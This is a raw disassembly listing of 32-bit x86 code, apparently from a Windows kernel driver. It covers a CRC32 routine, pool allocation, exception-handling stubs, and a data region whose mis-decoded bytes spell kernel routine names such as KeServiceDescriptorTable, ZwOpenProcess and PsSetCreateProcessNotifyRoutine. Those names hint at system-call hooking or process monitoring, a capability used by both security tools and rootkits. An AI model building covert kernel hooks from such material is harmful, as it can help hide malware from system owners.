   1d94a:	and    edx,ecx
   1d94c:	mov    edx,DWORD PTR [edx*4+0x7c290]
   1d953:	and    ebx,ecx
   1d955:	xor    edx,DWORD PTR [ebx*4+0x7c690]
   1d95c:	mov    ebx,eax
   1d95e:	shr    ebx,0x18
   1d961:	xor    edx,DWORD PTR [ebx*4+0x7be90]
   1d968:	and    eax,ecx
   1d96a:	xor    edx,DWORD PTR [eax*4+0x7ca90]
   1d971:	xor    edx,DWORD PTR [esi]
   1d973:	add    esi,edi
   1d975:	mov    eax,edx
   1d977:	shr    eax,0x10
   1d97a:	and    eax,ecx
   1d97c:	mov    eax,DWORD PTR [eax*4+0x7c290]
   1d983:	mov    ebx,edx
   1d985:	shr    ebx,0x8
   1d988:	and    ebx,ecx
   1d98a:	xor    eax,DWORD PTR [ebx*4+0x7c690]
   1d991:	mov    ebx,edx
   1d993:	shr    ebx,0x18
   1d996:	xor    eax,DWORD PTR [ebx*4+0x7be90]
   1d99d:	and    edx,ecx
   1d99f:	xor    eax,DWORD PTR [edx*4+0x7ca90]
   1d9a6:	dec    DWORD PTR [ebp-0x4]
   1d9a9:	jne    0x1d7fa
   1d9af:	cmp    DWORD PTR [ebp+0x8],edi
   1d9b2:	jb     0x1d9fc
   1d9b4:	mov    edx,DWORD PTR [ebp+0x8]
   1d9b7:	shr    edx,0x2
   1d9ba:	mov    DWORD PTR [ebp-0x4],edx
   1d9bd:	xor    eax,DWORD PTR [esi]
   1d9bf:	sub    DWORD PTR [ebp+0x8],edi
   1d9c2:	mov    edx,eax
   1d9c4:	shr    edx,0x10
   1d9c7:	and    edx,ecx
   1d9c9:	mov    edx,DWORD PTR [edx*4+0x7c290]
   1d9d0:	mov    ebx,eax
   1d9d2:	shr    ebx,0x8
   1d9d5:	and    ebx,ecx
   1d9d7:	xor    edx,DWORD PTR [ebx*4+0x7c690]
   1d9de:	mov    ebx,eax
   1d9e0:	shr    ebx,0x18
   1d9e3:	xor    edx,DWORD PTR [ebx*4+0x7be90]
   1d9ea:	and    eax,ecx
   1d9ec:	xor    edx,DWORD PTR [eax*4+0x7ca90]
   1d9f3:	add    esi,edi
   1d9f5:	dec    DWORD PTR [ebp-0x4]
   1d9f8:	mov    eax,edx
   1d9fa:	jne    0x1d9bd
   1d9fc:	cmp    DWORD PTR [ebp+0x8],0x0
   1da00:	pop    edi
   1da01:	pop    ebx
   1da02:	je     0x1da1b
   1da04:	movzx  edx,BYTE PTR [esi]
   1da07:	xor    edx,eax
   1da09:	and    edx,ecx
   1da0b:	shr    eax,0x8
   1da0e:	xor    eax,DWORD PTR [edx*4+0x7be90]
   1da15:	inc    esi
   1da16:	dec    DWORD PTR [ebp+0x8]
   1da19:	jne    0x1da04
   1da1b:	not    eax
   1da1d:	pop    esi
   1da1e:	leave  
   1da1f:	ret    0x4
   1da22:	int3   
   1da23:	int3   
   1da24:	int3   
   1da25:	int3   
   1da26:	int3   
   1da27:	int3   
   1da28:	mov    edi,edi
   1da2a:	push   ebp
   1da2b:	mov    ebp,esp
   1da2d:	mov    edx,DWORD PTR [ebp+0xc]
   1da30:	test   edx,edx
   1da32:	jne    0x1da38
   1da34:	xor    eax,eax
   1da36:	jmp    0x1da43
   1da38:	push   DWORD PTR [ebp+0x10]
   1da3b:	mov    eax,DWORD PTR [ebp+0x8]
   1da3e:	call   0x1d7b0
   1da43:	pop    ebp
   1da44:	ret    0xc
   1da47:	int3   
   1da48:	int3   
   1da49:	int3   
   1da4a:	int3   
   1da4b:	int3   
   1da4c:	mov    edi,edi
   1da4e:	push   ebp
   1da4f:	mov    ebp,esp
   1da51:	push   0x20
   1da53:	push   0x61737973
   1da58:	push   DWORD PTR [ebp+0x8]
   1da5b:	push   0x1
   1da5d:	call   DWORD PTR ds:0x1f018
   1da63:	test   eax,eax
   1da65:	jne    0x1da72
   1da67:	push   0xc000009a
   1da6c:	call   DWORD PTR ds:0x1f014
   1da72:	pop    ebp
   1da73:	ret    
   1da74:	int3   
   1da75:	int3   
   1da76:	int3   
   1da77:	int3   
   1da78:	int3   
   1da79:	cmp    ecx,DWORD PTR ds:0x7eb38
   1da7f:	jne    0x1da84
   1da81:	ret    0x0
   1da84:	jmp    0x1da8e
   1da89:	int3   
   1da8a:	int3   
   1da8b:	int3   
   1da8c:	int3   
   1da8d:	int3   
   1da8e:	mov    edi,edi
   1da90:	push   ebp
   1da91:	mov    ebp,esp
   1da93:	push   ecx
   1da94:	mov    DWORD PTR [ebp-0x4],ecx
   1da97:	push   0x0
   1da99:	push   DWORD PTR ds:0x7eb3c
   1da9f:	push   DWORD PTR ds:0x7eb38
   1daa5:	push   DWORD PTR [ebp-0x4]
   1daa8:	push   0xf7
   1daad:	call   DWORD PTR ds:0x1f05c
   1dab3:	int3   
   1dab4:	int3   
   1dab5:	int3   
   1dab6:	int3   
   1dab7:	int3   
   1dab8:	int3   
   1dab9:	int3   
   1daba:	jmp    DWORD PTR ds:0x1f008
   1dac0:	int3   
   1dac1:	int3   
   1dac2:	int3   
   1dac3:	int3   
   1dac4:	int3   
   1dac5:	int3   
   1dac6:	jmp    DWORD PTR ds:0x1f00c
   1dacc:	int3   
   1dacd:	int3   
   1dace:	int3   
   1dacf:	int3   
   1dad0:	int3   
   1dad1:	int3   
   1dad2:	jmp    DWORD PTR ds:0x1f010
   1dad8:	int3   
   1dad9:	int3   
   1dada:	int3   
   1dadb:	int3   
   1dadc:	int3   
   1dadd:	int3   
   1dade:	jmp    DWORD PTR ds:0x1f030
   1dae4:	int3   
   1dae5:	int3   
   1dae6:	int3   
   1dae7:	int3   
   1dae8:	int3   
   1dae9:	int3   
   1daea:	jmp    DWORD PTR ds:0x1f038
   1daf0:	int3   
   1daf1:	int3   
   1daf2:	int3   
   1daf3:	int3   
   1daf4:	int3   
   1daf5:	int3   
   1daf6:	jmp    DWORD PTR ds:0x1f03c
   1dafc:	int3   
   1dafd:	int3   
   1dafe:	int3   
   1daff:	int3   
   1db00:	int3   
   1db01:	int3   
   1db02:	jmp    DWORD PTR ds:0x1f048
   1db08:	int3   
   1db09:	int3   
   1db0a:	int3   
   1db0b:	int3   
   1db0c:	int3   
   1db0d:	int3   
   1db0e:	jmp    DWORD PTR ds:0x1f050
   1db14:	int3   
   1db15:	int3   
   1db16:	int3   
   1db17:	int3   
   1db18:	int3   
   1db19:	int3   
   1db1a:	int3   
   1db1b:	int3   
   1db1c:	push   0x1db80
   1db21:	push   DWORD PTR fs:0x0
   1db28:	mov    eax,DWORD PTR [esp+0x10]
   1db2c:	mov    DWORD PTR [esp+0x10],ebp
   1db30:	lea    ebp,[esp+0x10]
   1db34:	sub    esp,eax
   1db36:	push   ebx
   1db37:	push   esi
   1db38:	push   edi
   1db39:	mov    eax,ds:0x7eb38
   1db3e:	xor    DWORD PTR [ebp-0x4],eax
   1db41:	xor    eax,ebp
   1db43:	push   eax
   1db44:	mov    DWORD PTR [ebp-0x18],esp
   1db47:	push   DWORD PTR [ebp-0x8]
   1db4a:	mov    eax,DWORD PTR [ebp-0x4]
   1db4d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1db54:	mov    DWORD PTR [ebp-0x8],eax
   1db57:	lea    eax,[ebp-0x10]
   1db5a:	mov    fs:0x0,eax
   1db60:	ret    
   1db61:	mov    ecx,DWORD PTR [ebp-0x10]
   1db64:	mov    DWORD PTR fs:0x0,ecx
   1db6b:	pop    ecx
   1db6c:	pop    edi
   1db6d:	pop    edi
   1db6e:	pop    esi
   1db6f:	pop    ebx
   1db70:	mov    esp,ebp
   1db72:	pop    ebp
   1db73:	push   ecx
   1db74:	ret    
   1db75:	int3   
   1db76:	int3   
   1db77:	int3   
   1db78:	int3   
   1db79:	int3   
   1db7a:	int3   
   1db7b:	int3   
   1db7c:	int3   
   1db7d:	int3   
   1db7e:	int3   
   1db7f:	int3   
   1db80:	mov    edi,edi
   1db82:	push   ebp
   1db83:	mov    ebp,esp
   1db85:	sub    esp,0x14
   1db88:	push   ebx
   1db89:	mov    ebx,DWORD PTR [ebp+0xc]
   1db8c:	push   esi
   1db8d:	mov    esi,DWORD PTR [ebx+0x8]
   1db90:	xor    esi,DWORD PTR ds:0x7eb38
   1db96:	push   edi
   1db97:	mov    eax,DWORD PTR [esi]
   1db99:	mov    BYTE PTR [ebp-0x1],0x0
   1db9d:	mov    DWORD PTR [ebp-0x8],0x1
   1dba4:	lea    edi,[ebx+0x10]
   1dba7:	cmp    eax,0xfffffffe
   1dbaa:	je     0x1dbb9
   1dbac:	mov    ecx,DWORD PTR [esi+0x4]
   1dbaf:	add    ecx,edi
   1dbb1:	xor    ecx,DWORD PTR [eax+edi*1]
   1dbb4:	call   0x1da79
   1dbb9:	mov    ecx,DWORD PTR [esi+0xc]
   1dbbc:	mov    eax,DWORD PTR [esi+0x8]
   1dbbf:	add    ecx,edi
   1dbc1:	xor    ecx,DWORD PTR [eax+edi*1]
   1dbc4:	call   0x1da79
   1dbc9:	mov    eax,DWORD PTR [ebp+0x8]
   1dbcc:	test   BYTE PTR [eax+0x4],0x66
   1dbd0:	jne    0x1dcb8
   1dbd6:	mov    ecx,DWORD PTR [ebp+0x10]
   1dbd9:	lea    edx,[ebp-0x14]
   1dbdc:	mov    DWORD PTR [ebx-0x4],edx
   1dbdf:	mov    ebx,DWORD PTR [ebx+0xc]
   1dbe2:	mov    DWORD PTR [ebp-0x14],eax
   1dbe5:	mov    DWORD PTR [ebp-0x10],ecx
   1dbe8:	cmp    ebx,0xfffffffe
   1dbeb:	je     0x1dc4c
   1dbed:	lea    ecx,[ecx+0x0]
   1dbf0:	lea    eax,[ebx+ebx*2]
   1dbf3:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
   1dbf7:	lea    eax,[esi+eax*4+0x10]
   1dbfb:	mov    DWORD PTR [ebp-0xc],eax
   1dbfe:	mov    eax,DWORD PTR [eax]
   1dc00:	mov    DWORD PTR [ebp+0x8],eax
   1dc03:	test   ecx,ecx
   1dc05:	je     0x1dc1b
   1dc07:	mov    edx,edi
   1dc09:	call   0x1ddc1
   1dc0e:	mov    BYTE PTR [ebp-0x1],0x1
   1dc12:	test   eax,eax
   1dc14:	jl     0x1dc56
   1dc16:	jg     0x1dc5f
   1dc18:	mov    eax,DWORD PTR [ebp+0x8]
   1dc1b:	mov    ebx,eax
   1dc1d:	cmp    eax,0xfffffffe
   1dc20:	jne    0x1dbf0
   1dc22:	cmp    BYTE PTR [ebp-0x1],0x0
   1dc26:	je     0x1dc4c
   1dc28:	mov    eax,DWORD PTR [esi]
   1dc2a:	cmp    eax,0xfffffffe
   1dc2d:	je     0x1dc3c
   1dc2f:	mov    ecx,DWORD PTR [esi+0x4]
   1dc32:	add    ecx,edi
   1dc34:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc37:	call   0x1da79
   1dc3c:	mov    ecx,DWORD PTR [esi+0xc]
   1dc3f:	mov    edx,DWORD PTR [esi+0x8]
   1dc42:	add    ecx,edi
   1dc44:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc47:	call   0x1da79
   1dc4c:	mov    eax,DWORD PTR [ebp-0x8]
   1dc4f:	pop    edi
   1dc50:	pop    esi
   1dc51:	pop    ebx
   1dc52:	mov    esp,ebp
   1dc54:	pop    ebp
   1dc55:	ret    
   1dc56:	mov    DWORD PTR [ebp-0x8],0x0
   1dc5d:	jmp    0x1dc28
   1dc5f:	mov    ecx,DWORD PTR [ebp+0xc]
   1dc62:	call   0x1ddea
   1dc67:	mov    eax,DWORD PTR [ebp+0xc]
   1dc6a:	cmp    DWORD PTR [eax+0xc],ebx
   1dc6d:	je     0x1dc81
   1dc6f:	push   0x7eb38
   1dc74:	push   edi
   1dc75:	mov    edx,ebx
   1dc77:	mov    ecx,eax
   1dc79:	call   0x1de04
   1dc7e:	mov    eax,DWORD PTR [ebp+0xc]
   1dc81:	mov    ecx,DWORD PTR [ebp+0x8]
   1dc84:	mov    DWORD PTR [eax+0xc],ecx
   1dc87:	mov    eax,DWORD PTR [esi]
   1dc89:	cmp    eax,0xfffffffe
   1dc8c:	je     0x1dc9b
   1dc8e:	mov    ecx,DWORD PTR [esi+0x4]
   1dc91:	add    ecx,edi
   1dc93:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc96:	call   0x1da79
   1dc9b:	mov    ecx,DWORD PTR [esi+0xc]
   1dc9e:	mov    edx,DWORD PTR [esi+0x8]
   1dca1:	add    ecx,edi
   1dca3:	xor    ecx,DWORD PTR [edx+edi*1]
   1dca6:	call   0x1da79
   1dcab:	mov    eax,DWORD PTR [ebp-0xc]
   1dcae:	mov    ecx,DWORD PTR [eax+0x8]
   1dcb1:	mov    edx,edi
   1dcb3:	call   0x1ddd8
   1dcb8:	mov    edx,0xfffffffe
   1dcbd:	cmp    DWORD PTR [ebx+0xc],edx
   1dcc0:	je     0x1dc4c
   1dcc2:	push   0x7eb38
   1dcc7:	push   edi
   1dcc8:	mov    ecx,ebx
   1dcca:	call   0x1de04
   1dccf:	jmp    0x1dc28
   1dcd4:	int3   
   1dcd5:	int3   
   1dcd6:	int3   
   1dcd7:	int3   
   1dcd8:	int3   
   1dcd9:	int3   
   1dcda:	int3   
   1dcdb:	int3   
   1dcdc:	push   ebx
   1dcdd:	push   esi
   1dcde:	push   edi
   1dcdf:	mov    edx,DWORD PTR [esp+0x10]
   1dce3:	mov    eax,DWORD PTR [esp+0x14]
   1dce7:	mov    ecx,DWORD PTR [esp+0x18]
   1dceb:	push   ebp
   1dcec:	push   edx
   1dced:	push   eax
   1dcee:	push   ecx
   1dcef:	push   ecx
   1dcf0:	push   0x1dd5f
   1dcf5:	push   DWORD PTR fs:0x0
   1dcfc:	mov    eax,ds:0x7eb38
   1dd01:	xor    eax,esp
   1dd03:	mov    DWORD PTR [esp+0x8],eax
   1dd07:	mov    DWORD PTR fs:0x0,esp
   1dd0e:	mov    eax,DWORD PTR [esp+0x30]
   1dd12:	mov    ebx,DWORD PTR [eax+0x8]
   1dd15:	mov    ecx,DWORD PTR [esp+0x2c]
   1dd19:	xor    ebx,DWORD PTR [ecx]
   1dd1b:	mov    esi,DWORD PTR [eax+0xc]
   1dd1e:	cmp    esi,0xfffffffe
   1dd21:	je     0x1dd51
   1dd23:	mov    edx,DWORD PTR [esp+0x34]
   1dd27:	cmp    edx,0xfffffffe
   1dd2a:	je     0x1dd30
   1dd2c:	cmp    esi,edx
   1dd2e:	jbe    0x1dd51
   1dd30:	lea    esi,[esi+esi*2]
   1dd33:	lea    ebx,[ebx+esi*4+0x10]
   1dd37:	mov    ecx,DWORD PTR [ebx]
   1dd39:	mov    DWORD PTR [eax+0xc],ecx
   1dd3c:	cmp    DWORD PTR [ebx+0x4],0x0
   1dd40:	jne    0x1dd0e
   1dd42:	mov    ecx,0x1
   1dd47:	mov    eax,DWORD PTR [ebx+0x8]
   1dd4a:	call   0x1de7c
   1dd4f:	jmp    0x1dd0e
   1dd51:	pop    DWORD PTR fs:0x0
   1dd58:	add    esp,0x18
   1dd5b:	pop    edi
   1dd5c:	pop    esi
   1dd5d:	pop    ebx
   1dd5e:	ret    
   1dd5f:	mov    ecx,DWORD PTR [esp+0x4]
   1dd63:	test   DWORD PTR [ecx+0x4],0x6
   1dd6a:	mov    eax,0x1
   1dd6f:	je     0x1dda4
   1dd71:	mov    eax,DWORD PTR [esp+0x8]
   1dd75:	mov    ecx,DWORD PTR [eax+0x8]
   1dd78:	xor    ecx,eax
   1dd7a:	call   0x1da79
   1dd7f:	push   ebp
   1dd80:	mov    ebp,DWORD PTR [eax+0x18]
   1dd83:	push   DWORD PTR [eax+0xc]
   1dd86:	push   DWORD PTR [eax+0x10]
   1dd89:	push   DWORD PTR [eax+0x14]
   1dd8c:	call   0x1dcdc
   1dd91:	add    esp,0xc
   1dd94:	pop    ebp
   1dd95:	mov    eax,DWORD PTR [esp+0x8]
   1dd99:	mov    edx,DWORD PTR [esp+0x10]
   1dd9d:	mov    DWORD PTR [edx],eax
   1dd9f:	mov    eax,0x3
   1dda4:	ret    
   1dda5:	push   ebp
   1dda6:	mov    ecx,DWORD PTR [esp+0x8]
   1ddaa:	mov    ebp,DWORD PTR [ecx]
   1ddac:	push   DWORD PTR [ecx+0x1c]
   1ddaf:	push   DWORD PTR [ecx+0x18]
   1ddb2:	push   DWORD PTR [ecx+0x28]
   1ddb5:	call   0x1dcdc
   1ddba:	add    esp,0xc
   1ddbd:	pop    ebp
   1ddbe:	ret    0x4
   1ddc1:	push   ebp
   1ddc2:	push   esi
   1ddc3:	push   edi
   1ddc4:	push   ebx
   1ddc5:	mov    ebp,edx
   1ddc7:	xor    eax,eax
   1ddc9:	xor    ebx,ebx
   1ddcb:	xor    edx,edx
   1ddcd:	xor    esi,esi
   1ddcf:	xor    edi,edi
   1ddd1:	call   ecx
   1ddd3:	pop    ebx
   1ddd4:	pop    edi
   1ddd5:	pop    esi
   1ddd6:	pop    ebp
   1ddd7:	ret    
   1ddd8:	mov    ebp,edx
   1ddda:	mov    esi,ecx
   1dddc:	mov    eax,ecx
   1ddde:	xor    eax,eax
   1dde0:	xor    ebx,ebx
   1dde2:	xor    ecx,ecx
   1dde4:	xor    edx,edx
   1dde6:	xor    edi,edi
   1dde8:	jmp    esi
   1ddea:	push   ebp
   1ddeb:	mov    ebp,esp
   1dded:	push   ebx
   1ddee:	push   esi
   1ddef:	push   edi
   1ddf0:	push   0x0
   1ddf2:	push   0x0
   1ddf4:	push   0x1ddff
   1ddf9:	push   ecx
   1ddfa:	call   0x1de84
   1ddff:	pop    edi
   1de00:	pop    esi
   1de01:	pop    ebx
   1de02:	pop    ebp
   1de03:	ret    
   1de04:	push   ebp
   1de05:	mov    ebp,DWORD PTR [esp+0x8]
   1de09:	push   edx
   1de0a:	push   ecx
   1de0b:	push   DWORD PTR [esp+0x14]
   1de0f:	call   0x1dcdc
   1de14:	add    esp,0xc
   1de17:	pop    ebp
   1de18:	ret    0x8
   1de1b:	int3   
   1de1c:	int3   
   1de1d:	int3   
   1de1e:	int3   
   1de1f:	int3   
   1de20:	push   0x1db80
   1de25:	push   DWORD PTR fs:0x0
   1de2c:	mov    eax,DWORD PTR [esp+0x10]
   1de30:	mov    DWORD PTR [esp+0x10],ebp
   1de34:	lea    ebp,[esp+0x10]
   1de38:	sub    esp,eax
   1de3a:	push   ebx
   1de3b:	push   esi
   1de3c:	push   edi
   1de3d:	mov    eax,ds:0x7eb38
   1de42:	xor    DWORD PTR [ebp-0x4],eax
   1de45:	xor    eax,ebp
   1de47:	mov    DWORD PTR [ebp-0x1c],eax
   1de4a:	push   eax
   1de4b:	mov    DWORD PTR [ebp-0x18],esp
   1de4e:	push   DWORD PTR [ebp-0x8]
   1de51:	mov    eax,DWORD PTR [ebp-0x4]
   1de54:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1de5b:	mov    DWORD PTR [ebp-0x8],eax
   1de5e:	lea    eax,[ebp-0x10]
   1de61:	mov    fs:0x0,eax
   1de67:	ret    
   1de68:	mov    ecx,DWORD PTR [ebp-0x1c]
   1de6b:	xor    ecx,ebp
   1de6d:	call   0x1da79
   1de72:	jmp    0x1db61
   1de77:	int3   
   1de78:	int3   
   1de79:	int3   
   1de7a:	int3   
   1de7b:	int3   
   1de7c:	call   eax
   1de7e:	ret    
   1de7f:	int3   
   1de80:	int3   
   1de81:	int3   
   1de82:	int3   
   1de83:	int3   
   1de84:	jmp    DWORD PTR ds:0x1f068
   1de8a:	pop    esp
   1de8b:	add    BYTE PTR [eax],al
   1de8d:	add    BYTE PTR [eax],al
   1de8f:	add    BYTE PTR [ebx+0x0],ch
   1de92:	bound  eax,QWORD PTR [eax]
   1de94:	add    BYTE PTR fs:[ecx+0x0],dh
   1de98:	add    BYTE PTR [eax],al
   1de9a:	add    BYTE PTR fs:[ebx],dh
   1de9d:	add    BYTE PTR [eax+eax*1+0x73],ah
   1dea1:	add    BYTE PTR [eax],al
   1dea3:	add    BYTE PTR [esi+0x0],ch
   1dea6:	je     0x1dea8
   1dea8:	outs   dx,BYTE PTR ds:[esi]
   1dea9:	add    BYTE PTR [eax],al
   1deab:	add    BYTE PTR [ebx+0x0],dh
   1deae:	jns    0x1deb0
   1deb0:	jae    0x1deb2
   1deb2:	popa   
   1deb3:	add    BYTE PTR [eax],al
   1deb5:	add    BYTE PTR [edi+0x0],dh
   1deb8:	imul   eax,DWORD PTR [eax],0x65006e
   1debe:	add    BYTE PTR [eax],al
   1dec0:	jo     0x1dec2
   1dec2:	arpl   WORD PTR [eax],ax
   1dec4:	imul   eax,DWORD PTR [eax],0x6d0000
   1deca:	jae    0x1decc
   1decc:	jb     0x1dece
   1dece:	add    BYTE PTR [eax],al
   1ded0:	je     0x1ded2
   1ded2:	ins    DWORD PTR es:[edi],dx
   1ded3:	add    BYTE PTR [eax+0x0],dh
   1ded6:	add    BYTE PTR [eax],al
   1ded8:	jne    0x1deda
   1deda:	jae    0x1dedc
   1dedc:	bound  eax,QWORD PTR [eax]
   1dede:	add    BYTE PTR [eax],al
   1dee0:	outs   dx,DWORD PTR ds:[esi]
   1dee1:	add    BYTE PTR [eax+eax*1+0x65],ch
   1dee5:	add    BYTE PTR [eax],al
   1dee7:	add    BYTE PTR [ecx+0x0],ah
   1deea:	imul   eax,DWORD PTR [eax],0x70
   1def0:	push   0x0
   1def2:	popa   
   1def3:	add    BYTE PTR [ecx+0x0],bh
   1def6:	add    BYTE PTR [eax],al
   1def8:	jbe    0x1defa
   1defa:	add    BYTE PTR gs:[edx+0x0],dh
   1defe:	add    BYTE PTR [eax],al
   1df00:	jae    0x1df02
   1df02:	popa   
   1df03:	add    BYTE PTR [ecx+0x0],ch
   1df06:	add    BYTE PTR [eax],al
   1df08:	ins    BYTE PTR es:[edi],dx
   1df09:	add    BYTE PTR [ecx+0x0],ah
   1df0c:	arpl   WORD PTR [eax],ax
   1df0e:	add    BYTE PTR [eax],al
   1df10:	push   0x0
   1df12:	jo     0x1df14
   1df14:	add    BYTE PTR [bx+si],al
   1df17:	add    BYTE PTR [eax+0x0],ch
   1df1a:	imul   eax,DWORD PTR [eax],0x64
   1df20:	jo     0x1df22
   1df22:	outs   dx,BYTE PTR ds:[esi]
   1df23:	add    BYTE PTR [edi+0x0],ah
   1df26:	add    BYTE PTR [eax],al
   1df28:	outs   dx,BYTE PTR ds:[esi]
   1df29:	add    BYTE PTR [eax+eax*1+0x71],dh
   1df2d:	add    BYTE PTR [eax],al
   1df2f:	add    BYTE PTR [eax],al
   1df31:	int3   
   1df32:	dec    ebx
   1df33:	add    BYTE PTR [ebp+0x0],ah
   1df36:	push   ebx
   1df37:	add    BYTE PTR [ebp+0x0],ah
   1df3a:	jb     0x1df3c
   1df3c:	jbe    0x1df3e
   1df3e:	imul   eax,DWORD PTR [eax],0x650063
   1df44:	inc    esp
   1df45:	add    BYTE PTR [ebp+0x0],ah
   1df48:	jae    0x1df4a
   1df4a:	arpl   WORD PTR [eax],ax
   1df4c:	jb     0x1df4e
   1df4e:	imul   eax,DWORD PTR [eax],0x740070
   1df54:	outs   dx,DWORD PTR ds:[esi]
   1df55:	add    BYTE PTR [edx+0x0],dh
   1df58:	push   esp
   1df59:	add    BYTE PTR [ecx+0x0],ah
   1df5c:	bound  eax,QWORD PTR [eax]
   1df5e:	ins    BYTE PTR es:[edi],dx
   1df5f:	add    BYTE PTR [ebp+0x0],ah
   1df62:	add    BYTE PTR [eax],al
   1df64:	pop    edx
   1df65:	add    BYTE PTR [edi+0x0],dh
   1df68:	dec    edi
   1df69:	add    BYTE PTR [eax+0x0],dh
   1df6c:	add    BYTE PTR gs:[esi+0x0],ch
   1df70:	push   eax
   1df71:	add    BYTE PTR [edx+0x0],dh
   1df74:	outs   dx,DWORD PTR ds:[esi]
   1df75:	add    BYTE PTR [ebx+0x0],ah
   1df78:	add    BYTE PTR gs:[ebx+0x0],dh
   1df7c:	jae    0x1df7e
   1df7e:	add    BYTE PTR [eax],al
   1df80:	push   eax
   1df81:	add    BYTE PTR [ebx+0x0],dh
   1df84:	push   ebx
   1df85:	add    BYTE PTR [ebp+0x0],ah
   1df88:	je     0x1df8a
   1df8a:	dec    esp
   1df8b:	add    BYTE PTR [edi+0x0],ch
   1df8e:	popa   
   1df8f:	add    BYTE PTR [eax+eax*1+0x49],ah
   1df93:	add    BYTE PTR [ebp+0x0],ch
   1df96:	popa   
   1df97:	add    BYTE PTR [edi+0x0],ah
   1df9a:	add    BYTE PTR gs:[esi+0x0],cl
   1df9e:	outs   dx,DWORD PTR ds:[esi]
   1df9f:	add    BYTE PTR [eax+eax*1+0x69],dh
   1dfa3:	add    BYTE PTR [esi+0x0],ah
   1dfa6:	jns    0x1dfa8
   1dfa8:	push   edx
   1dfa9:	add    BYTE PTR [edi+0x0],ch
   1dfac:	jne    0x1dfae
   1dfae:	je     0x1dfb0
   1dfb0:	imul   eax,DWORD PTR [eax],0x65006e
   1dfb6:	add    BYTE PTR [eax],al
   1dfb8:	pop    edx
   1dfb9:	add    BYTE PTR [edi+0x0],dh
   1dfbc:	inc    esp
   1dfbd:	add    BYTE PTR [ebp+0x0],dh
   1dfc0:	jo     0x1dfc2
   1dfc2:	ins    BYTE PTR es:[edi],dx
   1dfc3:	add    BYTE PTR [ecx+0x0],ch
   1dfc6:	arpl   WORD PTR [eax],ax
   1dfc8:	popa   
   1dfc9:	add    BYTE PTR [eax+eax*1+0x65],dh
   1dfcd:	add    BYTE PTR [eax+eax*1+0x6f],dl
   1dfd1:	add    BYTE PTR [ebx+0x0],ch
   1dfd4:	add    BYTE PTR gs:[esi+0x0],ch
   1dfd8:	add    BYTE PTR [eax],al
   1dfda:	push   eax
   1dfdb:	add    BYTE PTR [ebx+0x0],dh
   1dfde:	push   ebx
   1dfdf:	add    BYTE PTR [ebp+0x0],ah
   1dfe2:	je     0x1dfe4
   1dfe4:	inc    ebx
   1dfe5:	add    BYTE PTR [edx+0x0],dh
   1dfe8:	add    BYTE PTR gs:[ecx+0x0],ah
   1dfec:	je     0x1dfee
   1dfee:	add    BYTE PTR gs:[eax+0x0],dl
   1dff2:	jb     0x1dff4
   1dff4:	outs   dx,DWORD PTR ds:[esi]
   1dff5:	add    BYTE PTR [ebx+0x0],ah
   1dff8:	add    BYTE PTR gs:[ebx+0x0],dh
   1dffc:	jae    0x1dffe
   1dffe:	dec    esi
   1dfff:	add    BYTE PTR [edi+0x0],ch
   1e002:	je     0x1e004
   1e004:	imul   eax,DWORD PTR [eax],0x790066
   1e00a:	push   edx
   1e00b:	add    BYTE PTR [edi+0x0],ch
   1e00e:	jne    0x1e010
   1e010:	je     0x1e012
   1e012:	imul   eax,DWORD PTR [eax],0x65006e
   1e018:	add    BYTE PTR [eax],al
   1e01a:	pop    edx
   1e01b:	add    BYTE PTR [edi+0x0],dh
   1e01e:	dec    edi
   1e01f:	add    BYTE PTR [eax+0x0],dh
   1e022:	add    BYTE PTR gs:[esi+0x0],ch
   1e026:	inc    esi
   1e027:	add    BYTE PTR [ecx+0x0],ch
   1e02a:	ins    BYTE PTR es:[edi],dx
   1e02b:	add    BYTE PTR [ebp+0x0],ah
   1e02e:	add    BYTE PTR [eax],al
   1e030:	pop    edx
   1e031:	add    BYTE PTR [edi+0x0],dh
   1e034:	push   ecx
   1e035:	add    BYTE PTR [ebp+0x0],dh
   1e038:	add    BYTE PTR gs:[edx+0x0],dh
   1e03c:	jns    0x1e03e
   1e03e:	dec    ecx
   1e03f:	add    BYTE PTR [esi+0x0],ch
   1e042:	data16 add BYTE PTR [edi+0x0],ch
   1e046:	jb     0x1e048
   1e048:	ins    DWORD PTR es:[edi],dx
   1e049:	add    BYTE PTR [ecx+0x0],ah
   1e04c:	je     0x1e04e
   1e04e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e054:	push   eax
   1e055:	add    BYTE PTR [edx+0x0],dh
   1e058:	outs   dx,DWORD PTR ds:[esi]
   1e059:	add    BYTE PTR [ebx+0x0],ah
   1e05c:	add    BYTE PTR gs:[ebx+0x0],dh
   1e060:	jae    0x1e062
   1e062:	add    BYTE PTR [eax],al
   1e064:	pop    edx
   1e065:	add    BYTE PTR [edi+0x0],dh
   1e068:	push   ecx
   1e069:	add    BYTE PTR [ebp+0x0],dh
   1e06c:	add    BYTE PTR gs:[edx+0x0],dh
   1e070:	jns    0x1e072
   1e072:	push   ebx
   1e073:	add    BYTE PTR [ecx+0x0],bh
   1e076:	jae    0x1e078
   1e078:	je     0x1e07a
   1e07a:	add    BYTE PTR gs:[ebp+0x0],ch
   1e07e:	dec    ecx
   1e07f:	add    BYTE PTR [esi+0x0],ch
   1e082:	data16 add BYTE PTR [edi+0x0],ch
   1e086:	jb     0x1e088
   1e088:	ins    DWORD PTR es:[edi],dx
   1e089:	add    BYTE PTR [ecx+0x0],ah
   1e08c:	je     0x1e08e
   1e08e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e094:	add    BYTE PTR [eax],al
   1e096:	pop    edx
   1e097:	add    BYTE PTR [edi+0x0],dh
   1e09a:	dec    edi
   1e09b:	add    BYTE PTR [eax+0x0],dh
   1e09e:	add    BYTE PTR gs:[esi+0x0],ch
   1e0a2:	dec    ebx
   1e0a3:	add    BYTE PTR [ebp+0x0],ah
   1e0a6:	jns    0x1e0a8
   1e0a8:	add    BYTE PTR [eax],al
   1e0aa:	pop    edx
   1e0ab:	add    BYTE PTR [edi+0x0],dh
   1e0ae:	inc    esp
   1e0af:	add    BYTE PTR [ebp+0x0],ah
   1e0b2:	ins    BYTE PTR es:[edi],dx
   1e0b3:	add    BYTE PTR [ebp+0x0],ah
   1e0b6:	je     0x1e0b8
   1e0b8:	add    BYTE PTR gs:[ebx+0x0],cl
   1e0bc:	add    BYTE PTR gs:[ecx+0x0],bh
